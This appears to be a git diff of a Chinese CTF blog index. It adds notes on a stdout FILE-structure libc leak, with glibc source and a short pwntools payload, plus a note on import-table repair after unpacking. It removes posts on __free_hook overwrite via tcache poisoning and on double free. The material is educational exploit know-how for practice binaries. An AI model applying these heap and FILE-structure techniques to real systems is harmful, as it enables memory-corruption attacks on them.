_IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          _IO_doallocbuf (f);</span><br><span class="line">          _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">         If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">         read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">         makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">         alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">          _IO_free_backup_area (f);</span><br><span class="line">          f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">          f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">                         f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">                      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>
+<p>而</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (ch == EOF)</span><br><span class="line">    return _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">                         f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>
+<p>有可能被我们控制。</p>
+<p>只需要满足：<code>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0</code>就会进行这个判断,也就是<code>_IO_CURRENTLY_PUTTING为1</code>(stdout中本来就是1)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br></pre></td></tr></table></figure>
+<p>考虑到<code>_IO_new_file_xsputn</code>中这条语句的影响，我们可以直接修改_IO_write_base的值</p>
+<p>再看<code>_IO_do_write</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">          || (<span class="keyword">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">off64_t</span> new_pos</span><br><span class="line">        = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">                       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">                       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了正常运行这个函数，不让他return 0.需要满足<code>_IO_IS_APPENDING=1</code></p>
+<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><p>泄露的实例如下，当我们可以控制stdout时，只需如下操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new(0x60,p64(0xfbad1800) + p64(0)*3 + &quot;\x00&quot;)</span><br><span class="line">leak = r.recv(0x20)</span><br><span class="line">leak = leak[0x18:]</span><br><span class="line">leak_Addr = u64(leak[:6].ljust(8,&quot;\x00&quot;))-e.symbols[&quot;_IO_file_jumps&quot;]</span><br><span class="line">print hex(leak_Addr)</span><br></pre></td></tr></table></figure>
+<p>另一个重点则在于如何劫持stdout结构体</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/04/输入表的替换/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/photo/hello.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/04/输入表的替换/" itemprop="url">输入表的替换</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-04T20:53:01+08:00">
+                2019-08-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  118
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>遇到一个题目，正常的手动脱壳完成之后运行程序失败，出现这样的东西</p>
+<p> <img src="/2019/08/04/输入表的替换/错误1.PNG" alt="错误1"></p>
+<p>解决的方法是使用工具ImportREConstructor 1.7e</p>
+<p>在IREC树形框里找到user32.dll 展开找到NtdllDefWindowProc_A</p>
+<p>在弹出窗口的module中找到user32.dll 然后在下面的列表框中找到DefWindowProcA</p>
+<p>在弹出窗口的module中找到user32.dll 然后在下面的列表框中找到DefWindowProcA<br>再修复就不会有这样的情况了</p>
+<p> <img src="/2019/08/04/输入表的替换/修正1.PNG" alt="修正1"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/22/seccomp-flag-s爆破/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1593,485 +2122,6 @@ void DFS(int v)//邻接矩阵的dfs
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/05/20/ctf线下攻防awd系列（1）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/photo/hello.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/05/20/ctf线下攻防awd系列（1）/" itemprop="url">ctf线下攻防awd系列（1）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-20T19:38:40+08:00">
-                2019-05-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  81
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>最近想写一些ctf线下攻防相关的东西</p>
-<p>想自己搭建一些环境然后玩玩，这一篇主要是介绍awd环境搭建相关信息。</p>
-<p>希望这一系列不会太监~</p>
-<h4 id="搞到了一份来自大佬的环境配置关怀"><a href="#搞到了一份来自大佬的环境配置关怀" class="headerlink" title="搞到了一份来自大佬的环境配置关怀"></a>搞到了一份来自大佬的环境配置关怀</h4><p><a href="https://github.com/sleicasper/ADplatform" target="_blank" rel="noopener">孙磊大佬玩过的awd，tql</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/05/14/堆溢出方向-free-hook的修改/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/photo/hello.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/05/14/堆溢出方向-free-hook的修改/" itemprop="url">堆溢出方向----_free_hook的修改</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-14T15:01:36+08:00">
-                2019-05-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  236
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>堆漏洞的寻找在现在的题目中其实并不是太难，当然，大多数套路题目不是很难。但是一些有质量的还是难的</p>
-<p>今天想记录的是关于堆漏洞的利用的一个方向-__free_hook的利用，也就是说，当我们可以进行覆盖tcachebin的fd的时候，我们可以直接将这个需要改写的地址设置成free_hook的地址。</p>
-<p>然后改写为onegadge的地址即可</p>
-<p>原理:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局变量的引用以及函数指针的使用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">weak_variable</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="keyword">void</span> *__ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    <span class="keyword">const</span> <span class="keyword">void</span> *)</span> </span>= <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>由于无法在这里构造chunk块，所以这时候其实是利用tcachebin的不严谨</p>
-<p>也恰恰是不需要构造chunk块，所以这时候就可以省好多事</p>
-<h3 id="free-hook的寻找"><a href="#free-hook的寻找" class="headerlink" title="free_hook的寻找"></a>free_hook的寻找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.symbols[&apos;__free_hook&apos;]</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/05/09/double-free的一次运用/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/photo/hello.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/05/09/double-free的一次运用/" itemprop="url">double free的以此运用</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-09T21:31:34+08:00">
-                2019-05-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  405
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>今天准备记录以下double free的一些运用。</p>
-<p>double free 顾名思义，是指一个指针连续free的两次，这是不正常的一种现象，那么这种不正常的原因是什么的？</p>
-<p>先看一个指针一次free之后会出现什么。</p>
-<p> <img src="/2019/05/09/double-free的一次运用/正常free.PNG" alt="正常free"></p>
-<p>也就是将free的这个地方给清零了。可是这种漏洞产生的原因在于，虽然这个地方清零了，但是指针还是存在的。也就是有漏洞的程序没有将保存指针的全局变量清零，或者数组清零。</p>
-<p>所以我们能够再次进行free这个地方了。so crazing </p>
-<p>再次free之后会出现什么</p>
-<p> <img src="/2019/05/09/double-free的一次运用/double free.PNG" alt="double free"></p>
-<p>出现了什么？居然出现了一个指针，而且恰好是这个堆的地址！</p>
-<p>why？</p>
-<p>其实原理就是和之前的fastbin的利用差不多，毕竟都是放在了一个链表中。只是这里的链表指向的是自身而已。我有时间会找一下源码~~放在这里</p>
-<p>所以说，下面的利用就是再申请一个同样大小的地址空间，so，我们就可以写入数据了，这时候我们只需要在这个地方写入一个地址，下次进行申请就会从这个地方进行申请了。</p>
-<p>就像fastbin中的利用一模一样~~只是那个是利用的堆溢出改写的fd而已，这里不需要栈溢出，因为下一个指向的地址我们已经可写，so</p>
-<p> <img src="/2019/05/09/double-free的一次运用/malloc13.PNG" alt="malloc13"></p>
-<p>再次申请 <img src="/2019/05/09/double-free的一次运用/mallloc2.PNG" alt="mallloc2"></p>
-<p>再次申请就是我们第一次写入的地址了</p>
-<p> <img src="/2019/05/09/double-free的一次运用/malloc3.PNG" alt="malloc3"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2126,7 +2176,7 @@ void DFS(int v)//邻接矩阵的dfs
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2207,7 +2257,7 @@ void DFS(int v)//邻接矩阵的dfs
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">18.7k</span>
+    <span title="Site words total count">21k</span>
   
 </div>
 
